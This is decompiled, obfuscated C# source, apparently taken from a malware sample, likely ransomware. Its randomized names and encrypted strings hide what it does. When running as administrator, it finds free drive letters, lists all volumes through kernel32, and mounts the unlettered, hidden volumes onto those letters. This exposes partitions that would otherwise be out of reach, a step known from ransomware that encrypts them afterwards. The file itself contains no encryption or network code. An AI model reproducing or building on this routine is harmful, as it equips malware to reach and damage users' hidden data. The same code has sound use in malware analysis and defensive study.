using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace azCTgkmpGT;

public static class KmvrzNiHHFG
{
	public enum QKlyHacfcbnP : uint
	{
		KrYNXzEKcqqg,
		wWVLDKMrAtOM,
		GsMIpwYHfV,
		cVhpkFyJDaGY,
		yhcrscJfpoaHZrJ,
		hAqAUNGkrDVGY,
		uSbDxnEBRT
	}

	private sealed class TZyeqPPsEXCu
	{
		public uint WqrPyTRqlP;

		public uint BTpMswDhEH;

		public char[] hXNVaChHygNHsNouNO;

		public bool _003CMountVolumes_003Eb__0(string string_0)
		{
			if (GetVolumePathNamesForVolumeNameW(string_0, hXNVaChHygNHsNouNO, BTpMswDhEH, ref WqrPyTRqlP))
			{
				return hXNVaChHygNHsNouNO.Length != 3;
			}
			return true;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	public static extern QKlyHacfcbnP GetDriveType([MarshalAs(UnmanagedType.LPStr)] string cPVHmEYvPXDKhL);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetVolumePathNamesForVolumeNameW(string HZCJVXWZYw, char[] vmXsWbCbEeHdmBCSM, uint myFIwMeMwuWrNSG, ref uint HfNKkmMhtPXEu);

	[DllImport("kernel32.dll")]
	internal static extern bool SetVolumeMountPoint(string string_0, string string_1);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern int FindFirstVolume(StringBuilder stringBuilder_0, int int_0);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern bool FindNextVolume(int int_0, StringBuilder stringBuilder_0, int int_1);

	public static List<string> LHuDqUbzpTCL()
	{
		StringBuilder stringBuilder = new StringBuilder(1024);
		List<string> list = new List<string>();
		int int_ = FindFirstVolume(stringBuilder, 1024);
		do
		{
			list.Add(stringBuilder.ToString());
			Console.WriteLine(stringBuilder.ToString());
		}
		while (FindNextVolume(int_, stringBuilder, 1024));
		return list;
	}

	public static void exgGMUymAdv()
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return;
		}
		try
		{
			TZyeqPPsEXCu CS_0024_003C_003E8__locals0 = new TZyeqPPsEXCu();
			string[] array = new string[26]
			{
				getString_0(107375855),
				getString_0(107375850),
				getString_0(107375813),
				getString_0(107375808),
				getString_0(107375803),
				getString_0(107375798),
				getString_0(107375825),
				getString_0(107375820),
				getString_0(107375815),
				getString_0(107375778),
				getString_0(107375773),
				getString_0(107375768),
				getString_0(107375795),
				getString_0(107375790),
				getString_0(107375785),
				getString_0(107375748),
				getString_0(107375743),
				getString_0(107375738),
				getString_0(107375765),
				getString_0(107375760),
				getString_0(107375755),
				getString_0(107375750),
				getString_0(107375713),
				getString_0(107375708),
				getString_0(107375703),
				getString_0(107375730)
			};
			string[] array2 = new string[array.Length];
			int num = 0;
			string[] array3 = array;
			foreach (string text in array3)
			{
				if (GetDriveType(text) == QKlyHacfcbnP.wWVLDKMrAtOM)
				{
					array2[num++] = text;
				}
			}
			List<string> source = LHuDqUbzpTCL();
			CS_0024_003C_003E8__locals0.WqrPyTRqlP = 0u;
			CS_0024_003C_003E8__locals0.BTpMswDhEH = 120u;
			CS_0024_003C_003E8__locals0.hXNVaChHygNHsNouNO = new char[260];
			foreach (string item in source.Where((string string_0) => !GetVolumePathNamesForVolumeNameW(string_0, CS_0024_003C_003E8__locals0.hXNVaChHygNHsNouNO, CS_0024_003C_003E8__locals0.BTpMswDhEH, ref CS_0024_003C_003E8__locals0.WqrPyTRqlP) || CS_0024_003C_003E8__locals0.hXNVaChHygNHsNouNO.Length != 3))
			{
				SetVolumeMountPoint(array2[num--], item);
				if (ACJZwXMCdgNnIA.SidumIOOlYmWUm)
				{
					try
					{
						Console.WriteLine(getString_0(107375725), array2[num--]);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (ACJZwXMCdgNnIA.SWaMdrdKGgzowGl)
			{
				try
				{
					File.AppendAllText(ACJZwXMCdgNnIA.bDDJFCkjBbYQ, getString_0(107375700) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static KmvrzNiHHFG()
	{
		Strings.CreateGetStringDelegate(typeof(KmvrzNiHHFG));
	}
}
